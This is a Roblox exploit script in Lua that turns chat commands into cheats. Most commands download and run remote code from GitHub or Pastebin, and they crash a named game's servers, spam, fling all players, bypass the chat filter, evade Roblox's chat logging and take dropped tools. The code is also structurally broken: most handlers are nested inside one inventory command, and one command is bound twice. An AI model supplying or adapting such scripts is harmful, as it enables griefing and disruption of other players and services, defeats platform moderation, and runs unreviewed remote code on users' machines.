--MADE BY Roblox: Urm8m (Alikhammas) Discord: urmoml0l--
--------------------CMDS--------------
-- /cmds
-- /crash-- for Dollhouse Roleplay VC
-- /boomboxraid-- for Dollhouse Roleplay VC
-- /hub-- for any game
-- /emoji-- for any game ( exapmle ":skull:, :cry:")
-- /anticrash-- for Dollhouse Roleplay VC
-- /swordreach-- for any Sword fight game
-- /pltiger-- for Prison life
-- /quickfling all-- flings all in the server--
-- /nonofling-- antifling--
-- /bypasser-- bypasses the chat filter--
-- /f3x-- only works in Sword Fight on the Heights (can move the 3 orange platforms.u need to enter the command "f3x" in infinite yeld after executing)
-- /kronefling-- Loopflings all players in server (krone bot fling)
-- /iy-- u should know what Infinite yield is :/--
-- /ftao-- only works in "Fling things and others"--
-- /afk-- afk messages, antiidle. means that u wont get kicked after 20 minutes without moving--
-- /rejoin-- the command explains it already--
-- /serverhop-- you know...--
-- /oof-- advanced resetting (tps u the same place u resetted)--
-- /gimmetools-- grabs all dropped tools in the server--
-- /dontyoudaretouchme-- flings everyone u touch--
-- /antilog-- prevents roblox from logging in ur previous chats and screenshots--
-- /getoutmyinv-- drops all tools in ur inv--

game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/boomboxraid" then loadstring(game:HttpGet("https://raw.githubusercontent.com/v9h/dhrpvc/main/spam.lua", false))() end end)
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/oof" then loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/oof"))() end end)
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/cmds" then loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/cmds"))() end end)
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/antilog" then loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/antilogger"))() end end)
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/quickfling all" then loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/lol/main/flips"))() end end)
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/dontyoudaretouchme" then loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))() end end)
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/serverhop" then loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/emoji/main/serverhop", true))() end end)
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/afk" then loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringypVvhJBq4QNz", true))() end end)
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/ftao" then loadstring(game:HttpGet("https://raw.githubusercontent.com/BlizTBr/scripts/main/FTAP.lua"))() end end)
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/iy" then loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source', true))() end end)
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/emoji" then loadstring(game:HttpGet('https://raw.githubusercontent.com/Alikhammass/emoji/main/emo', true))() end end)
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/kronefling" then loadstring(game:HttpGet('https://raw.githubusercontent.com/Alikhammass/antifling./main/loopfling', true))() end end)
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/f3x" then loadstring(game:HttpGet('https://raw.githubusercontent.com/Alikhammass/antifling./main/F3x', true))() end end)
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/bypasser" then loadstring(game:HttpGet('https://raw.githubusercontent.com/Alikhammass/antifling./main/chat%20bypasser', true))() end end)
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/nonofling" then loadstring(game:HttpGet('https://raw.githubusercontent.com/Alikhammass/antifling./main/Antifling', true))() end end)
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/swordreach" then loadstring(game:HttpGet('https://raw.githubusercontent.com/Alikhammass/emoji/main/swordreach', true))() end end)
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/quickfling all" then loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))() end end)
game:GetService("Players").LocalPlayer.Chatted:connect(
    function(msg)
        if string.lower(msg) == "/getoutmyinv" then
            for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
                v.Parent = workspace
            end

            game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/pltiger" then loadstring(game:HttpGet('https://raw.githubusercontent.com/h17s3/TIGERADMIN/main/TIGERADMINSCRIPTFREE', true))() end end)
            game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/anticrash" then loadstring(game:HttpGet("https://raw.githubusercontent.com/v9h/dhrpvc/main/anticrash.lua", true))() end end)
            game:GetService("Players").LocalPlayer.Chatted:connect(
                function(msg)
                    if string.lower(msg) == "/crash" then
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/harunscripts/scripts/main/DHRPVC_ServerCrasher.lua"))()
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/v9h/dhrpvc/main/spam.lua", false))()
                    end
                end
            )

            game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/boomboxraid" then loadstring(game:HttpGet("https://raw.githubusercontent.com/v9h/dhrpvc/main/spam.lua", false))() end end)
            game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/hub" then loadstring(game:HttpGet("https://raw.githubusercontent.com/i4mitty/Peruanito.exe/main/Peruanito.exe.lua"))() end end)
            game:GetService("Players").LocalPlayer.Chatted:connect(
                function(msg)
                    if string.lower(msg) == "/gimmetools" then
                        local p = game:GetService("Players").LocalPlayer
                        local c = p.Character
                        if c and c:FindFirstChild("Humanoid") then
                            for i, v in pairs(game:GetService("Workspace"):GetDescendants()) do
                                if v:IsA("Tool") then c:FindFirstChild("Humanoid"):EquipTool(v) end
                            end
                        end
                    end
                end
            )

            game:GetService("Players").LocalPlayer.Chatted:connect(
                function(msg)
                    if string.lower(msg) == "/rejoin" then
                        local ts = game:GetService("TeleportService")
                        local p = game:GetService("Players").LocalPlayer
                        ts:Teleport(game.PlaceId, p)
                    end
                end
            )

            game:GetService("Players").LocalPlayer.Chatted:connect(
                function(msg)
                    if string.lower(msg) == "/oof" then
                        game.Players.LocalPlayer.Character.Humanoid.Health = 0
                        function log()
                            deadpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                        end

                        game.Players.LocalPlayer.Character.Humanoid.Died:Connect(log)
                        game.Players.LocalPlayer.CharacterAdded:Connect(
                            function(char)
                                char:WaitForChild("Humanoid", 3).Died:Connect(log)
                                char:WaitForChild("HumanoidRootPart", 3).CFrame = deadpos
                            end
                        )
                    end
                end
            )
        end
    end
)
